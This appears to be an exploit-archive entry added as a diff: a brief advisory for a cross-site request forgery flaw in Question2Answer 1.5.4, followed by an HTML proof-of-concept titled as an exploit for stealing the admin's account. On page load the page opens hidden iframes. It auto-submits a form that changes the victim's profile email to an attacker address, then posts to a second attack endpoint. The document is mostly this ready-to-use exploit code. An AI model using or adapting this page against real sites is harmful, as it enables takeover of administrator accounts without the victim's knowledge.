@@ -1,0 +1,48 @@
+source: http://www.securityfocus.com/bid/58414/info
+
+Question2Answer is prone to a cross-site request-forgery vulnerability.
+
+Exploiting this issue may allow a remote attacker to perform certain unauthorized actions and gain access to the affected application. Other attacks are also possible.
+
+Question2Answer 1.5.4 is vulnerable; other versions may also be affected.
+
+<html>
+<head>
+<title>Exploit for stealing admin's account in Question2Answer. Made by
+MustLive. http://www.example.com</title>
+</head>
+<body onLoad="StartCSRF()">
+<script>
+function StartCSRF() {
+for (var i=1;i<=2;i++) {
+ var ifr = document.createElement("iframe");
+ ifr.setAttribute('name', 'csrf'+i);
+ ifr.setAttribute('width', '0');
+ ifr.setAttribute('height', '0');
+ document.body.appendChild(ifr);
+}
+CSRF1();
+setTimeout(CSRF2,1000);
+}
+function CSRF1() {
+window.frames["csrf1"].document.body.innerHTML = '<form name="hack"
+action="http://www.example.com/account"; method="post">n<input type="hidden"
+name="handle" value="test">n<input type="hidden" name="email"
+value="email () attacker com">n<input type="hidden" name="messages"
+value="1">n<input type="hidden" name="mailings" value="1">n<input
+type="hidden" name="field_1" value="test">n<input type="hidden"
+name="field_2" value="test">n<input type="hidden" name="field_3"
+value="test">n<input type="hidden" name="dosaveprofile"
+value="1">n</form>';
+window.frames["csrf1"].document.hack.submit();
+}
+function CSRF2() {
+window.frames["csrf2"].document.body.innerHTML = '<form name="hack"
+action="http://www.example.com/attack.php"; method="post">n<input type="hidden"
+name="do" value="1">n</form>';
+window.frames["csrf2"].document.hack.submit();
+}
+</script>
+</body>
+</html>
+
